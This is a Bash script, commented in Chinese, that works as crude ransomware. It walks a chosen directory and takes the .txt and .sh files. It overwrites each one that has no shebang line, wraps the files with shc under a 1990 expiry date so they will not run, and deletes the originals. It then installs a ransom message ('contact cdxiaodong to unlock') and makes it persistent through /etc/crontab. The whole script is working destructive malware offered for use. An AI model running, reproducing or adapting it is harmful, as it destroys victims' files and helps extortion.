#!/bin/bash
rm 100.txt &>/dev/null
rm 99.txt &>/dev/null
touch 100.txt
tmpfile="100.txt"
touch 99.txt
mkdir shangchuanjia

apt-get -y install shc &>/dev/null
yum -y install shc &>/dev/null

function read_dir() {
        for file in `ls $1`
        do
                if [ -d $1"/"$file ]; # 判断是否是目录，是目录则递归
                then
                        read_dir $1"/"$file
                elif [ -f $1"/"$file ]; # 判断是否是文件，输出屏幕
                then
                        echo  $1"/"$file  >> $tmpfile
                else
                        echo  $1"/"$file 
                fi
        done
}

read -p "请输入要加密文件的总目录:" mulu
path=("/"$mulu)
read_dir $path
cat 100.txt | awk '/\.txt/||/\.sh/' > 99.txt  #后面按照这个格式自己加  
#url=$(cat 100.txt | awk '/txt/')
#echo $url

cat 99.txt | while read line
do
#由于shc默认是给脚本使用，而且是给第一行必须是#!/bin/bash的脚本使用
#这个时候就献上了我们的na大法
if ! grep "^#!" "$line" &>/dev/null;
then
    cat > "$line" << EOF
#!/bin/bash
EOF
fi

shc -e 01/01/1990 -v -f $line   #给$line.x设置期限，让对方用不了
cp -a $line shangchuanjia
rm $line
rm $line.x.c
done

apt-get -y install dialog &>/dev/null
yum -y install dialog &>/dev/null

touch lesuo.sh

cat > lesuo.sh << EOF
#!/bin/bash
dialog --msgbox "哈哈恭喜你被勒索了" 10 40
dialog --msgbox "想要解锁请联系cdxiaodong" 20 40
EOF
chmod 777 lesuo.sh


#找lesuo.sh的路径
lujing=$(find / -name lesuo.sh 2>/dev/null) #因为本地kali测验的时候会查找/100/dvfs文件
#会产生报错 需要null掉


#定时启动
cat >> /etc/crontab << EOF
0 */2 * * * $lujing  #每两个小时运行 有别的需要就自己改
EOF